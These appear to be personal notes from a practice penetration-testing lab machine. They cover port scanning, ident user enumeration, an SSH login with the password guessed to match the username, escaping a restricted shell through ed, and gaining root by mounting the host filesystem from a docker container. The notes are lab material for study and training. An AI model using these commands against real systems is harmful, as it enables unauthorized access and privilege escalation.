Linux ttl=61

# scan

```
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
113/tcp   open  ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open  postgresql        PostgreSQL DB 12.3 - 12.4
8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
|_http-title: Redmine
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
| http-robots.txt: 10 disallowed entries 
| /projects/test/repository /projects/test/issues 
| /projects/test/activity /projects/1/repository /projects/1/issues 
|_/projects/1/activity /issues/gantt /issues/calendar /activity /search
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sat, 29 Jun 2024 07:53:05 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sat, 29 Jun 2024 07:52:57 GMT
|     Connection: close
|_    Hello World
|_auth-owners: eleanor
```

# rabbit hole

### port 8080

redmine is running on it but can't find a way to get RCE with exploit

![[Pasted image 20240629132708.png]]

https://github.com/slowmistio/Redmine-CVE-2019-18890/blob/master/exploit.py

### postgre

![[Pasted image 20240629132745.png]]

it was also newer version

# initial

![[Pasted image 20240629132818.png]]

left with this new thing

https://book.hacktricks.xyz/network-services-pentesting/113-pentesting-ident

![[Pasted image 20240629132845.png]]

just followed that

![[Pasted image 20240629132925.png]]

```
ident-user-enum 192.168.194.60 22 113 8080 5432 10000
```

left only SSH as this is offsec nothing hurt to try same username for pass

Woo-Hoo!!

![[Pasted image 20240629133045.png]]

# priv esc

### again restricted shell

![[Pasted image 20240629133151.png]]

rbash again, whenerver see this, look into `bin` folder to know which commands are available for current user

![[Pasted image 20240629133357.png]]

only `ed` is one which can give shell

```
ed
```

```
!/bin/bash
```

still it's not working so checked at walkthough

```
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

we need to add this in order to run it

![[Pasted image 20240629133819.png]]

### actual priv esc

user is part of `docker` group

![[Pasted image 20240629134152.png]]

docker is already installed, to check that

```
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```

In this case I can use regular docker commands to communicate with the docker daemon

as I can see there's 2 image

now I can use gtfobins command of docker with replacing image name

```
docker run -v /:/mnt --rm -it redmine chroot /mnt sh
```

![[Pasted image 20240629134810.png]]

https://gtfobins.github.io/gtfobins/docker/

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#mounted-docker-socket-escape

https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/peppo